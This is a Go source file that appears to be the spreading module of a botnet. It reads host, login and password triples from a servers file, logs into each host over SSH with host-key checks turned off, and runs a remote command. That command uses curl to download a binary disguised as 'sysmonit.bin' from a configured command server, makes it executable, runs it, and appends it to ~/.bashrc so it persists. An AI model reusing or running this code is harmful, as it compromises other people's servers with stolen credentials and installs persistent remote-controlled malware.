package server

import (
	"bytes"
	"fmt"
	"homo/network/config"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

type Sshsess struct {
	Ip       string
	Password string
	Login    string
	Config   *ssh.ClientConfig
	Session  *ssh.Client
}

func Scan() {

	data, err := os.ReadFile("./data/servers.txt")
	if err != nil {
		fmt.Println("Read servers: " + err.Error())
	}

	for _, i := range strings.Split(string(data), "\n") {
		serv := strings.Split(string(i), ":")

		fmt.Println(serv)
		ses := sshNew(serv[1], serv[2], serv[0])
		ses.Inject()
	}
}

func sshNew(login, pass string, host string) *Sshsess {

	conf := &ssh.ClientConfig{
		User:    login,
		Timeout: 5 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", host+":22", conf)

	if err != nil {
		fmt.Println(err)
	}

	return &Sshsess{
		Ip:       host,
		Password: pass,
		Login:    login,
		Config:   conf,
		Session:  conn,
	}
}

func (sess *Sshsess) Inject() {

	sshSesh, _ := sess.Session.NewSession()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession

	var host string
	if !config.GetConfig().Api.CustomPathEnabled {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
	} else {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
	}

	fmt.Println(host)

	sshSesh.Run("rm ../bin/sysmonit.bin; curl -X POST http://" + host + " -o ../bin/sysmonit.bin ; chmod +x ../bin/sysmonit.bin ; ../bin/sysmonit.bin; ../bin/sysmonit.bin >> ~/.bashrc")

	sshSesh.Close()
}
